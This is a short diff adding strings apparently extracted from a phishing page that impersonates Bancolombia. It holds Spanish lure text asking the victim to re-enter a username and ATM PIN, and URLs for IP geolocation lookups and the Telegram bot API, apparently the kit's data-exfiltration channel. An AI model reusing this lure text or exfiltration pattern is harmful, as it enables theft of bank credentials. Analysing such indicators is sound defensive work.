@@ -1,0 +1,16 @@
+Ingrese sus Datos actuales
+para Reactivar ¡Gracias!
+Bancolombia
+Taipei, TW
+¿No estás registrado?
+
+Ingrese sus Datos actuales
+para Reactivar iGracias!
+Bancolombia
+Ingresa tu Usuario
+Clave de Cajero
+
+URLs:
+https://api.ipify.org?format=json
+https://ipinfo.io
+https://api.telegram.org/bot
